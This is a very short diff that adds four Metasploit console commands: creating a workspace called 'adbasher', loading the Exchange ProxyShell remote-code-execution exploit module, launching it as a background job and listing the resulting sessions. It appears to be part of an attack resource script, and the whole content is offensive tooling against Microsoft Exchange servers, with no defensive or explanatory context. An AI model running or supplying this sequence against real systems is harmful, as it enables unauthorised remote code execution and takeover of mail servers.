@@ -1,0 +1,4 @@
+workspace -a adbasher
+use exploit/windows/http/exchange_proxyshell_rce
+exploit -j -z
+sessions
